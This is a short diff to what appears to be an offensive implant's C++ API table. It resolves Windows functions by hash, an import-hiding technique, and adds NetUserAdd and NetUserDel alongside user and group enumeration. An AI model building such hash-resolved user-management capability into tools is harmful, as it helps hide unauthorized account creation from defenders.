@@ -413,6 +413,10 @@ namespace Procs
         pProcs->lpNetApiBufferFree              = reinterpret_cast<LPPROC_NETAPIBUFFERFREE>(pNetApiBufferFree);
         PVOID pNetLocalGroupEnum                = GetProcAddressByHash(hNetapi32, HASH_FUNC_NETLOCALGROUPENUM);
         pProcs->lpNetLocalGroupEnum             = reinterpret_cast<LPPROC_NETLOCALGROUPENUM>(pNetLocalGroupEnum);
+        PVOID pNetUserAdd                       = GetProcAddressByHash(hNetapi32, HASH_FUNC_NETUSERADD);
+        pProcs->lpNetUserAdd                    = reinterpret_cast<LPPROC_NETUSERADD>(pNetUserAdd);
+        PVOID pNetUserDel                       = GetProcAddressByHash(hNetapi32, HASH_FUNC_NETUSERDEL);
+        pProcs->lpNetUserDel                    = reinterpret_cast<LPPROC_NETUSERDEL>(pNetUserDel);
         PVOID pNetUserEnum                      = GetProcAddressByHash(hNetapi32, HASH_FUNC_NETUSERENUM);
         pProcs->lpNetUserEnum                   = reinterpret_cast<LPPROC_NETUSERENUM>(pNetUserEnum);
 
